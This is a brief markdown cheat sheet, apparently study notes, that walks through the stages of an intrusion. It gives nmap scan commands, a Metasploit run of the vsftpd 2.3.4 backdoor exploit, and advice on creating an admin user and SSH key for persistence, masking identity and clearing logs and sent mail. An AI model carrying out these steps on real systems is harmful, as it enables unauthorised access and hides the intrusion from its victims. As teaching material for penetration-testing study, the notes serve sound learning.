# Hacking Steps
### Reconnaissance
```
Identifying the Target, finding out the target's IP Address Range, Network, DNS records.
nmap -sn 192.168.0.1-100 # sn is ping scan
```
### Scanning
```
This phase includes the usage of tools like dialers, port scanners, network mappers, sweepers, and vulnerability scanners to scan data.
nmap -v -sV [ip]
```
### Gaining Access
```
Choose the attack strategy and launch it.
msfconsole
msf> 
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.0.0.3
exploit
background
```
### Maintaining Access
```
Create a user, add as admin. Create an ssh key and add in the .ssh folder to future access.
```
### Clearing Tracks (so no one can reach them)
```
Prior to the attack, the attacker would change their MAC address and run the attacking machine through at least one VPN to help cover their identity.
Includes clearing out Sent emails, clearing server logs, temp files.
```
